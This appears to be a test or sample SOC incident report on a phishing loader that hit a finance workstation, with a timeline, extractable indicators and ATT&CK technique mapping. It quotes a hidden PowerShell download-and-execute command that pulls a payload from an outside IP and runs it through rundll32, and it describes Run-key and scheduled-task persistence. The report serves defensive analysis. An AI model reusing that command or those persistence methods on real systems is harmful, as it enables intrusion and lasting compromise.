# Test Incident Report: Phishing Loader in Enterprise Windows Environment

## Summary

On 2026-03-14, the SOC received multiple alerts tied to suspicious outbound traffic from workstation `FIN-WS-044` used by an accounts payable employee. The user reported that an email with the subject `Updated payment schedule for March` contained a link to a document hosted on `hxxps://sharepoint-docs-check[.]com/login/Review_Invoice_0314.pdf`. After opening the page, the user downloaded `Review_Invoice_0314.pdf.exe`, which executed from `C:\Users\apetrova\Downloads\Review_Invoice_0314.pdf.exe`.

Within three minutes the endpoint created persistence through `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\OneDrive Update` pointing to `C:\Users\apetrova\AppData\Roaming\Microsoft\OneDrive\onedrive_sync.exe`. The file `onedrive_sync.exe` had SHA-256 `6d8a0f9a5a36cb2ab5d344a4d8a2cf9d4e49d66c8cb8ef0b4ef2f9d2f9bc2e11` and MD5 `1f3870be274f6c49b3e31a0c6728957f`.

The compromised host resolved and contacted `cdn-auth-check[.]com` and `api-collab-sync[.]net` over HTTPS. Proxy telemetry shows repeated requests to `hxxps://api-collab-sync[.]net/gate.php` with user-agent `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36`. Connections were observed to `185.193.126.44`, `45.141.84.62`, and `2a0b:6b80:1::44`.

PowerShell logs show the following command line launched by the loader:

`powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "iwr hxxp://185.193.126[.]44/update.dat -OutFile $env:TEMP\\update.dat; rundll32.exe $env:TEMP\\update.dat,Start"`

The downloaded payload `update.dat` was saved as `C:\Users\apetrova\AppData\Local\Temp\update.dat`. The DLL wrote a secondary file to `C:\ProgramData\WindowsTask\\taskhostsvc.exe` and established scheduled task `Windows Update Monitor`.

## Timeline

- 2026-03-14 08:13 UTC: phishing email delivered from `billing@vendor-support-mail[.]com`
- 2026-03-14 08:17 UTC: user clicked `hxxps://sharepoint-docs-check[.]com/login/Review_Invoice_0314.pdf`
- 2026-03-14 08:18 UTC: `Review_Invoice_0314.pdf.exe` executed
- 2026-03-14 08:19 UTC: persistence added in `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- 2026-03-14 08:21 UTC: outbound C2 to `api-collab-sync[.]net` and `185.193.126.44`
- 2026-03-14 08:27 UTC: EDR isolated host

## Extractable IOCs

- Domain: `sharepoint-docs-check.com`
- Domain: `cdn-auth-check.com`
- Domain: `api-collab-sync.net`
- Domain: `vendor-support-mail.com`
- URL: `https://sharepoint-docs-check.com/login/Review_Invoice_0314.pdf`
- URL: `https://api-collab-sync.net/gate.php`
- URL: `http://185.193.126.44/update.dat`
- IPv4: `185.193.126.44`
- IPv4: `45.141.84.62`
- IPv6: `2a0b:6b80:1::44`
- SHA-256: `6d8a0f9a5a36cb2ab5d344a4d8a2cf9d4e49d66c8cb8ef0b4ef2f9d2f9bc2e11`
- MD5: `1f3870be274f6c49b3e31a0c6728957f`
- File path: `C:\Users\apetrova\Downloads\Review_Invoice_0314.pdf.exe`
- File path: `C:\Users\apetrova\AppData\Roaming\Microsoft\OneDrive\onedrive_sync.exe`
- File path: `C:\Users\apetrova\AppData\Local\Temp\update.dat`
- File path: `C:\ProgramData\WindowsTask\taskhostsvc.exe`
- Registry key: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\OneDrive Update`
- User-Agent: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36`

## Recommended ATT&CK Mapping

- Matrix: ATT&CK Enterprise
- Likely tactics: Initial Access, Execution, Persistence, Command and Control
- Likely techniques:
  - `T1566.002` Phishing: Spearphishing Link
  - `T1204.002` User Execution: Malicious File
  - `T1059.001` Command and Scripting Interpreter: PowerShell
  - `T1547.001` Registry Run Keys / Startup Folder
  - `T1053.005` Scheduled Task
  - `T1071.001` Application Layer Protocol: Web Protocols
  - `T1105` Ingress Tool Transfer
